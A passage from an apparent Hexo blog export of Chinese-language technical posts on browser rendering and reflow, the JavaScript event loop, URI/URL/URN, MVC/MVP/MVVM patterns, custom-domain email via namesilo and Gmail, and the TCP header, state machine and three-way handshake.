</li>
<li><p>根据文档对象模型树与样式规则树建立渲染树（Rendering Tree）</p>
</li>
<li><p>根据渲染树计算所有节点的几何尺寸，进行布局（layout)，或者叫回流（reflow）</p>
</li>
<li><p>最后调用操作系统 Native GUI 的 API 进行绘制</p>
</li>
<li><p>当用户操作改变了样式时，则会触发重绘（repaint）或回流（reflow）</p>
</li>
</ul>
<p>注意事项：</p>
<ol>
<li><p>生成 CSS 规则树时，CSS 匹配 HTML 元素是需要递归遍历的，这既复杂又耗性能，若 CSS 规则嵌套过深将严重影响性能。</p>
</li>
<li><p>渲染树中不包含不可见元素，如 head 元素及 display 为 none 的元素</p>
</li>
</ol>
<h3 id="浏览器渲染的阻塞"><a href="#浏览器渲染的阻塞" class="headerlink" title="浏览器渲染的阻塞"></a>浏览器渲染的阻塞</h3><ol>
<li><p>现代浏览器是并行加载资源的，阻塞只是针对主线程构建 DOM 树，并不影响预解析后续的资源进行请求</p>
</li>
<li><p>CSS 不会阻塞 DOM 构建，但现在几乎所有的前端应用都有 JavaScript，因为 JavaScript 阻塞了 DOM，而 JavaScript 也可能操作 CSS，这就需要 CSS 在 JavaScript 执行前构建完成，故 CSS 通过阻塞 JavaScript，表现出了阻塞 DOM 的现象。这也是为什么 CSS 的引入 link 标签通常在 JavaScript 的 script 标签前</p>
</li>
<li><p>无 defer 与 async 属性的 script 标签会触发浏览器的渲染并阻塞 DOM 树的构建，在加载与执行完 JavaScript 后再继续 DOM 树的构建，这也是 script 标签通常放在 body 结束标签前的原因</p>
</li>
<li><p>有 defer 属性的 script 标签不会阻塞 DOM 树的构建，异步加载后一直等待到 DOMContentLoaded 事件前，按 script 的顺序执行 JavaScript，执行完成后触发 DOMContentLoaded 事件（DOMContentLoaded 事件仅指 DOM 加载完成，load 事件则表示整个页面都完全渲染加载）</p>
</li>
<li><p>有 async 属性的 script 标签可能会阻塞 DOM 树的构建，因为其异步加载完成后就会直接执行，可能在 DOMContentLoaded 前也可能在 DOMContentLoaded 后，但一定在 load 事件前。若在 DOMContentLoaded 前加载完成执行，此时 DOM 还未完成构建，将阻塞 DOM 树构建。</p>
</li>
<li><p>async 与 defer 属性都只在有 src 即外部引入的 script 标签生效</p>
</li>
</ol>
<h3 id="重绘与回流"><a href="#重绘与回流" class="headerlink" title="重绘与回流"></a>重绘与回流</h3><ul>
<li><p>重绘（repaint）：我们对 DOM 的样式进行了修改，但不涉及元素的几何属性时，浏览器无需重新计算元素的几何属性，直接为该元素绘制新样式</p>
</li>
<li><p>回流/重排（reflow/relayout）：我们对 DOM 的样式进行了修改引发了元素几何属性的变化（如元素宽高或显隐），浏览器需要重新计算元素几何属性后，再进行绘制</p>
</li>
</ul>
<p>特点：</p>
<ol>
<li><p>回流必定重绘，但重绘不一定回流</p>
</li>
<li><p>回流的性能消耗大于重绘</p>
</li>
</ol>
<p>引起回流的情形：</p>
<ul>
<li><p>添加、删除可见 DOM 元素</p>
</li>
<li><p>元素尺寸改变——margin、padding、border、width、height</p>
</li>
<li><p>元素内容改变——input 中输入字</p>
</li>
<li><p>元素位置改变</p>
</li>
<li><p>浏览器窗口尺寸改变——resize 事件</p>
</li>
<li><p>计算 offsetWidth 和 offsetHeight</p>
</li>
<li><p>设置 style 即行内属性值时</p>
</li>
<li><p>激活 css 伪类，如:hover</p>
</li>
<li><p>改变浏览器默认字体大小</p>
</li>
</ul>
<p>减少回流的方式：</p>
<ul>
<li><p>不使用 table 布局</p>
</li>
<li><p>尽量使用 class 控制样式而不是 JavaScript</p>
</li>
<li><p>使用 visibility:hidden 替代 display:none</p>
</li>
<li><p>减少 css 的嵌套层级</p>
</li>
<li><p>避免使用 css 表达式，如 calc()</p>
</li>
<li><p>将动画元素脱离文档流，使用绝对定位，减少对其他元素的影响</p>
</li>
<li><p>尽量减少 DOM 操作并将必要的 DOM 操作一起完成</p>
</li>
<li><p>尽量不要使用会引起浏览器清空回流队列的属性，如</p>
<ul>
<li>clientWidth、clientHeight、clientLeft、clientTop</li>
<li>offsetWidth、offsetHeight、offsetLeft、offsetTop</li>
<li>scrollWidth、scrollHeight、scrollLeft、scrollTop</li>
<li>width、height</li>
<li>getComputedStyle()</li>
<li>getBoundingClientRect()</li>
<li>scrollIntoView()、scrollIntoViewIfNeeded()、scrollTo</li>
</ul>
<p>浏览器对回流的优化是将一系列回流的操作放入一个队列中，当达到一定数量或时间达到一定间隔后，一起执行，这样可以把多次回流整合为一次，而上述属性与方法会导致清空队列，立即执行回流</p>
</li>
</ul>
<h2 id="JavaScript-引擎线程-1"><a href="#JavaScript-引擎线程-1" class="headerlink" title="JavaScript 引擎线程"></a>JavaScript 引擎线程</h2><p>JavaScript 引擎线程的核心工作机制是事件循环（event loop）</p>
<p>相关概念：</p>
<ul>
<li><p>堆（heap）：一大块非结构化的内存区域，对象、数据被存放在堆中</p>
</li>
<li><p>栈（stack）：栈在 JavaScript 中又称为执行栈、调用栈（call stack），是一种后进先出的数据结构。Javascript 引擎线程会执行所有调用栈中的任务。例如，函数执行时会被放在调用栈的顶部，执行完成后又从栈顶移出，JavaScript 引擎线程会一直执行，直到调用栈被清空</p>
</li>
<li><p>队列（queue）：队列在 JavaScript 中又称为任务队列、消息队列（message queue），是一种先进先出的数据结构。ES6 后又针对微任务增加了工作队列（job queue）</p>
</li>
</ul>
<h3 id="ES6-以前的事件循环"><a href="#ES6-以前的事件循环" class="headerlink" title="ES6 以前的事件循环"></a>ES6 以前的事件循环</h3><h4 id="同步任务与异步任务"><a href="#同步任务与异步任务" class="headerlink" title="同步任务与异步任务"></a>同步任务与异步任务</h4><p>由于 JavaScript 是单线程的，所以所有的任务都需要排队，前一个任务执行完成才能执行下一个。如果一个任务中有 IO 操作，如网络请求等，这些 IO 操作的耗时远远大于 CPU 执行代码时间，CPU 此时已经把 IO 操作前的任务代码执行完成，处于空闲等待 IO 操作的状态，虽然 CPU 空闲，但因为单线程任务排队的机制，下一个任务并无法执行。为了减少 CPU 空闲时间的浪费，JavaScript 将任务分为两种：同步任务与异步任务。</p>
<p>同步任务：调用立即会得到结果的任务，它们在主线程上排队，前一个任务执行完成才能执行后一个任务</p>
<p>异步任务：指无法立即得到结果，需要额外操作触发才能获得结果的任务。异步任务不进入主线程，而是触发后进入消息队列。</p>
<p>具体的过程为 JavaScript 引擎遇到异步任务，如事件监听、网络请求、计时器等，会交给相对应的线程去维护任务，等待得到结果，如用户点击、请求成功、计时结束等，对应线程会将异步的回调函数加入消息队列中，等待被主线程执行。</p>
<h4 id="事件循环的过程"><a href="#事件循环的过程" class="headerlink" title="事件循环的过程"></a>事件循环的过程</h4><ol>
<li><p>将所有同步任务交由 JavaScript 引擎线程执行，进入调用栈</p>
</li>
<li><p>遇到异步任务，则交由对应异步线程执行，待有结果后将带有结果的回调函数添加到消息队列中，表示异步任务已经可继续下一步执行</p>
</li>
<li><p>调用栈中的所有同步任务执行完成后，会检查消息队列，将消息队列中所有回调函数依次压入调用栈，开始执行</p>
</li>
<li><p>主线程不断重复上面三步就形成了事件循环</p>
</li>
</ol>
<h3 id="ES6-事件循环"><a href="#ES6-事件循环" class="headerlink" title="ES6 事件循环"></a>ES6 事件循环</h3><p>ES6 后，由于增加了非常重要的 Promise，这也就使得事件循环也有了不小的改变。</p>
<p>基本概念：</p>
<ul>
<li><p>宏任务（macro task）：script 标签中的所有代码、setTimeout、setInterval、I/O（如网络请求）、UI 交互事件、MessageChannel、setImmediate（Node.js 环境）</p>
</li>
<li><p>微任务（micro task）：Promise.then、MutationObserver、Process.nextTick（Node.js 环境），<strong>微任务通常都会对应当前调用栈中的宏任务，例如 Promise 通常在异步网络请求成功后 resolve，那么 Promise.then 的微任务就对应网络请求的宏任务；一个极端情况就是直接 resolve，那么 Promise.then 的微任务就对应当前调用栈中正在执行的宏任务</strong></p>
</li>
<li><p>消息队列（message queue）：包含了异步线程添加的已得到结果的宏任务回调函数</p>
</li>
<li><p>工作队列（job queue）：包含了微任务回调函数</p>
</li>
</ul>
<h4 id="事件循环过程"><a href="#事件循环过程" class="headerlink" title="事件循环过程"></a>事件循环过程</h4><ol>
<li><p>script 标签中的所有代码是一个特殊的宏任务，页面载入时，它是消息队列中唯一的任务，此时的工作队列是空的。我们可以将 script 标签中的所有代码理解成一个特殊的函数，这时，这个特殊的函数从消息队列移入调用栈，消息队列与工作队列都为空，代码开始执行</p>
</li>
<li><p>代码执行过程中，遇到宏任务就将它交给相对应的异步线程去处理，等得到结果后，由引对应的异步线程将带有结果的回调函数添加到消息队列中，等待执行；同样的，代码执行过程中，遇到微任务，则将微任务的回调函数添加到工作队列中</p>
</li>
<li><p>script 标签中所有代码执行完成，调用栈为空，此时检查工作队列中是否有未执行的回调函数，将工作队列中的所有回调函数依次压入调用栈执行，直到工作队列为空</p>
</li>
<li><p>工作队列中的所有回调函数执行完成，此时调用栈为空，工作队列为空，渲染线程根据最新的 DOM 开始回流或重绘</p>
</li>
<li><p>渲染线程完成工作后挂起，JavaScript 引擎线程从消息队列中取出下一个宏任务，压入调用栈开始执行，之后重复 2、3、4、5 步</p>
</li>
</ol>
<p>现在我们将 script 标签中所有代码不再当作特殊宏任务，就总结出了事件循环的过程</p>
<ul>
<li><p>从消息队列中取出一个宏任务压入调用栈中执行</p>
</li>
<li><p>代码在调用栈中执行时，依据宏任务与微任务不同，将得到结果的回调函数添加至消息队列或工作队列</p>
</li>
<li><p>宏任务执行完成后检查工作队列，将其中回调函数依次压入调用栈执行，直至工作队列为空</p>
</li>
<li><p>渲染线程工作</p>
</li>
<li><p>渲染线程执行完成后重复上述步骤</p>
</li>
</ul>
<p>以上就是 ES6 的事件循环机制。</p>
<h4 id="ES6-与-ES5-事件循环的对比"><a href="#ES6-与-ES5-事件循环的对比" class="headerlink" title="ES6 与 ES5 事件循环的对比"></a>ES6 与 ES5 事件循环的对比</h4><p>在 ES5 中，事件循环是以消息队列<strong>所有</strong>任务清空一次为一个周期的；但 ES6 中，事件循环则是以消息队列中的<strong>一个</strong>宏任务执行完成并将宏任务执行周期内产生的所有微任务执行完成作为一个周期的</p>
<h4 id="Promise-保证了什么"><a href="#Promise-保证了什么" class="headerlink" title="Promise 保证了什么"></a>Promise 保证了什么</h4><p>相信明白了 ES6 的事件循环机制，你也就明白了 Promise 为什么叫 Promise，它到底保证了什么。</p>
<p>试想一下，如果 Promise 依然按照原来事件循环机制，网络请求成功后，将得到结果的回调函数添加在消息队列的末尾，倘若消息队列中有一个耗时操作，就可能导致网络请求的回调函数被阻塞，虽然请求成功，但迟迟不响应。而增加了工作队列，Promise.then 的回调函数被添加到网络请求宏任务执行后的工作队列中，网络请求的宏任务执行完成后，立即执行工作队列中的回调函数，这样就不会被阻塞或延迟，Promise 所“保证”的正是这种执行的及时性。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络URI</title>
    <url>/2020/05/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CURI/</url>
    <content><![CDATA[<h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>统一资源标识符（Uniform Resource Identifier），是用于唯一标识某一互联网资源的字符串。</p>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>统一资源定位符（Uniform Resource Locator），URL 是 URI 以定位方式的一种实现。</p>
<p>统一资源定位符的完整格式如下：<br>[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级 UNIX 文件路径][文件名]?[查询]#[片段 ID]</p>
<p>其中[访问凭证信息]、[端口号]、[查询]、[片段 ID]都属于选填项。</p>
<p>例如：<code>http://www.example.com/index.html</code></p>
<h2 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h2><p>统一资源命名符（Uniform Resource Name），URN 是 URI 以命名方式的一种实现。</p>
<p>在旧的规范中，URN 相当于 URI，是一种规范性的定义。在新的规范中，URN 作为规范性定义的功能已被 URI 取代，URN 和 URL 则成为了 URI 的一种实现，特定情况下 URI 可能同时拥有 URN 与 URL。</p>
<p>URN 的格式：<code>urn:&lt;NID&gt;:&lt;NSS&gt;</code>，NID 为命名空间，NSS 为唯一名称</p>
<p>例如：<code>urn:issn:0167-6423</code></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>URI</tag>
        <tag>URL</tag>
        <tag>URN</tag>
      </tags>
  </entry>
  <entry>
    <title>程序架构模式</title>
    <url>/2020/05/03/%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>复杂的软件一定要有架构设计，好的架构模式使得软件更易于维护与扩展。架构模式（architectural pattern），属于编程方法论。</p>
<h2 id="MVC-模式"><a href="#MVC-模式" class="headerlink" title="MVC 模式"></a>MVC 模式</h2><p>MVC 是 View-Model-Controller 的缩写，该架构模式是指将软件系统分为三个基本部分：</p>
<ul>
<li><p>模型（Model）：用于封装与应用程序业务逻辑相关的数据以及对数据的处理方法。Model 有对数据直接访问的权力，例如对数据库的访问。Model 不依赖 View 和 Controller，也就是说 Model 不关心它会被如何显示或如何被操作。但是 Model 中数据的变化一般会通过一种刷新机制被公布。为了实现这种机制，那些用于监视此 Model 的 View 必须事先在此 Model 上注册，从而使 View 可以了解在数据 Model 上发生的改变。（如：软件设计模式中的观察者模式）</p>
</li>
<li><p>视图（View）：能够实现数据有目的地显示。在 View 中一般没有程序上的逻辑。为了实现 View 上的刷新功能，View 需要访问它监视的数据模型（Model），因此应该事先在被它监视的数据那时注册。</p>
</li>
<li><p>控制器（Controller）：起到不同层面间的组织作用，用于控制应用程序的流程。它处理事件并作出响应。“事件”包括用户的行为和数据 Model 上的改变。</p>
</li>
</ul>
<span id="more"></span>

<h3 id="MVC-的通信方式"><a href="#MVC-的通信方式" class="headerlink" title="MVC 的通信方式"></a>MVC 的通信方式</h3><ol>
<li><p>用户通过在 View 上点击、输入等事件，传输指令到 Controller。</p>
</li>
<li><p>Controller 依据定义好的业务逻辑，要求 Model 改变状态。</p>
</li>
<li><p>Model 将更新后的数据发送到 View，用户看到数据的变化(还有一种常见的情况是 Model 不直接与 View 交互，而是通知 Controller 去改变 View)。</p>
</li>
</ol>
<p><img src="../images/MVC.png" alt="MVC"></p>
<h2 id="MVP-模式"><a href="#MVP-模式" class="headerlink" title="MVP 模式"></a>MVP 模式</h2><p>MVP 是 Model-View-Presenter 的缩写，是由 MVC 模式演变而来，MVP 中将 MVC 的 Controller 变为 Presenter。</p>
<p>MVP 与 MVC 的区别：</p>
<ol>
<li><p>通过 Presenter 对 Model 与 View 进行隔离。</p>
</li>
<li><p>View 与 Presenter、Presenter 与 Model 之间的通信是双向的。</p>
</li>
<li><p>View 层变得非常薄，不再部署业务逻辑，所有业务逻辑都增加到了 Presenter 层。</p>
</li>
</ol>
<h3 id="MVP-的通信方式"><a href="#MVP-的通信方式" class="headerlink" title="MVP 的通信方式"></a>MVP 的通信方式</h3><ol>
<li><p>当 View 接收到用户事件时，会将事件转交给 Presenter 处理。</p>
</li>
<li><p>Presenter 操作 Model 改变数据状态。</p>
</li>
<li><p>Model 完成数据状态改变后通知 Presenter 改变 View</p>
</li>
<li><p>Presenter 通过 View 向外界暴露接口更新视图内容。</p>
</li>
</ol>
<p><img src="../images/MVP.png" alt="MVP"></p>
<h2 id="MVVM-模式"><a href="#MVVM-模式" class="headerlink" title="MVVM 模式"></a>MVVM 模式</h2><p>MVVM 是 Model-View-ViewModel 的缩写。是 MVP 模式的进一步演化。MVVM 将 MVP 中的 Presenter 变为 ViewModel，主要区别是 ViewModel 实现了与 View 的双向绑定，使得 View 的变动自动反应到 ViewModel 上，反之亦然。</p>
<p>可以这样理解：ViewModel 是 View 的一个抽象，而 View 是 ViewModel 的渲染结果。</p>
<h3 id="MVVM-的通信方式"><a href="#MVVM-的通信方式" class="headerlink" title="MVVM 的通信方式"></a>MVVM 的通信方式</h3><ol>
<li><p>用户操作造成 View 变动时，这种变化自动更新到 ViewModel。</p>
</li>
<li><p>ViewModel 将数据的变化更新到 Model。</p>
</li>
<li><p>Model 完成更新后通知 ViewModel，ViewModel 将变化自动反应到 View 上。</p>
</li>
</ol>
<p><img src="../images/MVVM.png" alt="MVVM"></p>
]]></content>
      <categories>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>MVC</tag>
        <tag>MVP</tag>
        <tag>MVVM</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义域名邮箱</title>
    <url>/2020/06/14/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><ul>
<li><p>google 邮箱（其他支持代发的邮箱也可）</p>
</li>
<li><p>namesilo 域名（其他支持设置邮件转发的域名商也可）</p>
</li>
</ul>
<h2 id="一、通过域名服务商设置邮件转发"><a href="#一、通过域名服务商设置邮件转发" class="headerlink" title="一、通过域名服务商设置邮件转发"></a>一、通过域名服务商设置邮件转发</h2><p>进入 namesilo 域名管理页面，选择 Email forwarding 的 config 选项，设置自定义的用户名与要转发到的 google 邮箱。</p>
<h2 id="二、添加邮箱解析，设置-MX-记录"><a href="#二、添加邮箱解析，设置-MX-记录" class="headerlink" title="二、添加邮箱解析，设置 MX 记录"></a>二、添加邮箱解析，设置 MX 记录</h2><p>进入 namesilo 域名管理页面，选择 DNS 管理页面，添加默认的 Email forwarding 模板，即可生成 namesilo 默认的 MX 记录。还可以设置 TXT 的 SPF 记录以防止被仿冒。新建 TXT 记录，设置值为 v=spf1 include:_spf.google.com ~all。</p>
<p>完成这两步后，以你域名与自定义用户名为邮箱地址的邮箱就可以接收邮件并转发至你的 google 邮箱了。</p>
<p>那么如何使在发信时也使用这个自定义邮箱呢？</p>
<h2 id="三、使用-Gmail-从自定义邮箱发送邮件"><a href="#三、使用-Gmail-从自定义邮箱发送邮件" class="headerlink" title="三、使用 Gmail 从自定义邮箱发送邮件"></a>三、使用 Gmail 从自定义邮箱发送邮件</h2><p>进入 Gmail 邮箱设置——账号和导入——用这个地址发送邮件，添加自定义域名地址，smtp 服务器则填写 smtp.gmail.com，再填入 google 邮箱密码即可。这一步可能需要降低 google 安全级别才能成功。因为 google 不推荐使用 smtp 形式发送邮件。这一步本质上还是在用 google 的邮箱服务发送邮件，只是发件人替换成了自定义的邮箱地址。设置完成后会在 google 邮箱中收到确认邮件，确认后就可以用自定义域名发送了。如果要默认使用自定义域名发送邮件，则继续回到账号和导入设置界面，将刚刚添加的地址，设置为默认即可。</p>
]]></content>
      <categories>
        <category>邮箱</category>
      </categories>
      <tags>
        <tag>namesilo</tag>
        <tag>邮箱</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络TCP协议</title>
    <url>/2019/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CTCP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>注意：octet 与 byte 相同都是指 8 位 1 字节，但在计算机网络中 byte 易引起混淆，故都用 octet，译为八位字节</p>
<h3 id="TCP-头部格式"><a href="#TCP-头部格式" class="headerlink" title="TCP 头部格式"></a>TCP 头部格式</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">TCP Header Format

    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |           |U|A|P|R|S|F|                               |
   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
   |       |           |G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                             data                              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                            TCP Header Format

          Note that one tick mark represents one bit position.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>TCP 协议头部一般为 20 字节，最大不超过 60 字节，且是一个整数的 32 位长。</p>
<span id="more"></span>

<p>Source Port：源端口号，16 位</p>
<p>Destination Port：目标端口号，16 位</p>
<p>Sequence Number：该数据分片第一个数据八位字节的序列号，32 位，该字段用于正确组装数据分片（segment，也译为数据包或数据分段），TCP 可靠性依赖于序列号实现。当 SYN 控制位存在时，则序列号为初始序列号 ISN，第一个数据八位字节的序列号为 ISN + 1</p>
<p>Acknowledgment Number：确认号，32 位，若设置了 ACK 控制位，确认号代表的值为发送方期望收到的下一个数据分片的序列号，当连接建立后，确认号总是会被发送</p>
<p>Data Offset：数据偏移，4 位，代表 TCP 头部有多少个 32 位词。这指示了数据部分从哪里开始。</p>
<p>Reserved：保留字，6 位，为以后使用预留，必需为 0</p>
<p>Control Bits：控制位，6 位</p>
<ul>
<li><p>URG：紧急指针字段标识</p>
</li>
<li><p>ACK：确认字段标识</p>
</li>
<li><p>PSH：推送功能</p>
</li>
<li><p>RST：重置连接</p>
</li>
<li><p>SYN：同步序列号，只在请求建立连接时存在，即仅在三次握手的前两次中使用同步位，代表序列号为初始序列号 ISN</p>
</li>
<li><p>FIN：发送方无更多数据</p>
</li>
</ul>
<p>Window：窗口大小，16 位，发送方能够接收到缓冲区八位字节数据数量</p>
<p>Checksum：校验和，16 位，由发送端计算，接收端验证的判断数据分片头部与正文是否有差错的字段</p>
<p>Urgent Pointer：紧急指针，16 位，代表在序列号基础上的正偏移量，指向紧急数据之后的八位字节序列号，这个字段只在 URG 控制位存在的情况下生效</p>
<p>Options：TCP 头部可选项，变长字段，在 TCP 头部的末尾，是八位字节的倍数</p>
<p>Padding：填充项，变长，补零以保证 TCP 头部结束与数据开始于 32 位的边界。</p>
<h3 id="TCP-状态图"><a href="#TCP-状态图" class="headerlink" title="TCP 状态图"></a>TCP 状态图</h3><p><img src="/images/tcp-state-transition-diagram.png" alt="tcp-state-transition-diagram.png"></p>
<h4 id="状态说明"><a href="#状态说明" class="headerlink" title="状态说明"></a>状态说明</h4><p>LISTEN - 代表等待从远程端口来的 TCP 连接请求</p>
<p>SYN-SENT - 代表发送连接请求后等待匹配的连接</p>
<p>SYN-RECEIVED - 代表已经接收了连接请求并回复了连接确认请求后等待对方的连接确认请求</p>
<p>ESTABLISHED - 代表一个开放连接，接收到的数据可以传送给用户。这是一个连接在数据传输阶段的通常状态</p>
<p>FIN-WAIT-1 - 代表发送了连接终止请求后，等待远程 TCP 的连接的确认请求（前置状态为 ESTABLISHED）</p>
<p>FIN-WAIT-2 - 代表收到了远程 TCP 连接对于终止请求的确认请求后，等待远程 TCP 的连接的终止请求（前置状态为 FIN-WAIT-2）</p>
<p>CLOSE-WAIT - 代表收到远程 TCP 连接的终止请求并发送了确认请求后，等待关闭，此时会判断是否还有数据要发送（前置状态为 ESTABLISHED）</p>
<p>CLOSING - 代表向远程 TCP 连接发送连接终止请求后没有收到对方的确认请求，而是收到了远程 TCP 的连接终止请求，这时会向远程 TCP 发送终止确认请求。CLOSING 状态不常见，几乎双方同时发送连接终止请求才会出现（前置状态为 FIN-WAIT-1）</p>
<p>LAST-ACK - 代表待发送的数据已经发送完成，并发送了连接终止请求，等待之前发送给远程 TCP 连接终止请求的确认请求（前置状态为 CLOSE-WAIT）</p>
<p>TIME-WAIT - 代表等待足够的时间以确保远程 TCP 收到了其连接终止请求的确认请求（前置状态为 FIN-WAIT-2）</p>
<p>CLOSED - 代表无连接</p>
<h3 id="TCP-连接流程图"><a href="#TCP-连接流程图" class="headerlink" title="TCP 连接流程图"></a>TCP 连接流程图</h3><p><img src="/images/tcp.png" alt="tcp.png"></p>
<h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><h4 id="为什么要握手三次"><a href="#为什么要握手三次" class="headerlink" title="为什么要握手三次"></a>为什么要握手三次</h4><blockquote>
<p>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误<br>——《计算机网络》谢希仁</p>
<p>防止服务器开销的浪费<br>两次握手已经建立了全双工的通信。这个通信将占用客户端与服务器的通信线路，直到它被一方关闭为止。<br>如果没有请求方的第三次的发送确认数据，且网络环境不佳的情况下，一旦客户端超时没有收到服务器的数据（可能是客户端发往服务端的数据慢了，也可能是服务端确认的数据慢了），客户端就会重新请求建立连接。</p>
<ol>
<li>如果是客户端往服务端发送的请求慢了但最终还是被收到了，那么服务端就会认为这是客户端的新请求，建立了多余的连接，浪费了服务器资源。</li>
<li>如果是服务端返回的确认慢了，客户端认为超时了，那么服务端其实在返回确认的时候就已经建立了连接，而客户端认为连接失败了，重新请求，那么又建立多余连接，浪费了服务器资源。<br>——来源于网络</li>
</ol>
<p>A：喂，你能听到我说话吗？<br>B：我能听到，你能听到我说话吗？<br>A：我也能听到你说话，今天 blabla<br>——常见类比</p>
</blockquote>
<p>准确地说，以上几种说法与类比仅仅是从某一个方面片面地解释了为什么 TCP 握手要三次的表因，而没有把握到三次握手的本质原因。</p>
<p>让我们来看看<a href="https://www.ietf.org/rfc/rfc793.txt">RFC793</a>（TCP 协议的 RFC）中关于可靠性的描述</p>
<blockquote>
<p>Reliability:</p>
<p>The TCP must recover from data that is damaged, lost, duplicated, or delivered out of order by the internet communication system.  This is achieved by assigning a sequence number to each octet transmitted, and requiring a positive acknowledgment (ACK) from the receiving TCP.  If the ACK is not received within a timeout interval, the data is retransmitted.  At the receiver, the sequence numbers are used to correctly order segments that may be received out of order and to eliminate duplicates.  Damage is handled by adding a checksum to each segment transmitted, checking it at the receiver, and discarding damaged segments.</p>
<p>As long as the TCPs continue to function properly and the internet system does not become completely partitioned, no transmission errors will affect the correct delivery of data.  TCP recovers from internet communication system errors.</p>
</blockquote>
<p>可靠性：TCP 必须从损坏的、丢失的、重复的和因网络问题乱序的数据中恢复正确的数据。这样的可靠性是基于发送每个八位字节时都带有一个序列号，并且还要求要有一个来自于已接收 TCP 包中的主动确认号。如果在一个超时间隔内，没有收到确认号，那么数据将会被重传。对接收方而言，序列号用于正确排序收到的乱序数据分片（数据包）与丢弃重复的数据分片（数据包）。我们通过在每一个数据分片中加入一个校验和来处理数据损坏的情况，接收方将会检查并丢弃损坏的数据分片。只要 TCPs 工作正常并且网络系统没有被完全分隔，那么传输错误将不会影响到正确的数据接收，TCP 可以从网络错误中恢复。</p>
<p>那么为什么要用三次握手是必要的呢？RFC 中有云：</p>
<blockquote>
<p>A three way handshake is necessary because sequence numbers are not tied to a global clock in the network, and TCPs may have different mechanisms for picking the ISN’s.  The receiver of the first SYN has no way of knowing whether the segment was an old delayed one or not, unless it remembers the last sequence number used on the connection (which is not always possible), and so it must ask the sender to verify this SYN.</p>
</blockquote>
<p>三次握手之所以必要是因为序列号并没有在网络中绑定全局时钟，并且 TCPs 可能有不同的机制来选取初始序列号 ISN。接收方无法判断第一个获得的数据分片（或称数据包）是否是旧的延迟到达的。除非接收方能够记住这个连接中的最后一个序列号（这并不总是可行的），所以接收方必须向发送方确认同步的标识 SYN，也就是初始序列号 ISN。</p>
<p>从上面两段文字中可以看出<strong>TCP 协议的可靠性是基于 seq 序列号实现的</strong>，由于无法绑定全局时钟，也无法保证一个连接能记住最后一个序列号，所以无法判断数据分片是否是旧的，只能通过三次握手确认通信双方的 ISN（initial sequence number 初始序列号），保证双方后续传输的数据分片最终是连续、可靠、可组装的。</p>
<h4 id="三次握手详细过程"><a href="#三次握手详细过程" class="headerlink" title="三次握手详细过程"></a>三次握手详细过程</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">    TCP A                                                TCP B

1.  CLOSED                                                    LISTEN

2.  SYN-SENT     -->  &lt;SEQ=100>&lt;CTL=SYN>                 -->  SYN-RECEIVED

3.  ESTABLISHED  &lt;--  &lt;SEQ=300>&lt;ACK=101>&lt;CTL=SYN,ACK>    &lt;--  SYN-RECEIVED

4.  ESTABLISHED  -->  &lt;SEQ=101>&lt;ACK=301>&lt;CTL=ACK>        -->  ESTABLISHED

5.  ESTABLISHED  -->  &lt;SEQ=101>&lt;ACK=301>&lt;CTL=ACK>&lt;DATA>  -->  ESTABLISHED

        Basic 3-Way Handshake for Connection Synchronization<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>TCP A 处于 CLOSE 状态，TCP B 处于 LISTEN 状态</li>
